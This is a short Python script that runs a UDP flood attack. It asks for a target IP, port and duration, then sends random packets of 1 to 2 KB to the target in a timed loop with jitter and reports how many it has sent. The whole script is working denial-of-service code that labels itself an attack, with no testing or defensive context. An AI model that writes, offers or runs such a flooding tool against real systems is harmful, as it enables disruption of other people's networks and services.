import socket
import random
import time

target = input("Enter the target IP: ")
port = int(input("Enter the target port: "))
seconds = int(input("How long should the attack last (in seconds)? "))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
end = time.time() + seconds
count = 0

print("Sending packets...")

try:
    while time.time() < end:
        data = random._urandom(random.randint(1024, 2048))
        sock.sendto(data, (target, port))
        count += 1

        if count % 100 == 0:
            print(f"Sent {count} packets")

        time.sleep(random.uniform(0.002, 0.01))  # some jitter
except KeyboardInterrupt:
    print("Stopped.")
except Exception as e:
    print("Error:", e)
else:
    print("Finished sending.")
